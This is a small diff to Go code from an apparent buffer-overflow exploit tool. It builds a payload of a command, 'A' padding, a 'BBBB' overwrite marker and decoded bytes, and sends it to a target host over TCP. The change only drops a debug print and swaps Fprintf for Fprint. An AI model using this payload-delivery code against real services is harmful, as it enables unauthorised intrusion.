@@ -146,7 +146,6 @@ OUTER:
 
 	//Assemble and send payload
 	payload := fmt.Sprint(c.Cmd + strings.Repeat("A", o) + "BBBB" + string(decoded))
-	fmt.Println(payload)
 	fmt.Printf("Sending payload to %s:%d with command: %s..."+"\n", c.Host, c.Port, c.Cmd)
 	err := sendPayload(c, payload)
 	if err != nil {
@@ -223,7 +222,7 @@ func sendPayload(conf Config, payload string) error {
 		return err
 	}
 
-	_, err = fmt.Fprintf(conn, payload+"\r\n")
+	_, err = fmt.Fprint(conn, payload+"\r\n")
 	if err != nil {
 		return err
 	}
